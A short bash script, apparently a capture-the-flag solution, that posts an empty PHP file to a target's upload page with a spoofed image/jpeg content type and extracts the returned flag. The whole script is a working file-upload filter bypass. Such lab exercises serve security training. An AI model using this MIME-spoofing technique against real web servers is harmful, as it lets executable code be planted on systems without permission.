#!/bin/bash

url="http://$1/index.php?page=upload"
fileToUpload="uploaded=@/tmp/empty.php;type=image/jpeg"

touch /tmp/empty.php
req=$(curl -X POST -F "Upload=submit" -F ${fileToUpload} ${url} --silent)
res=$(echo ${req} | grep -oE 'The flag is : [[:alnum:]]{1,100}')
echo ${res}
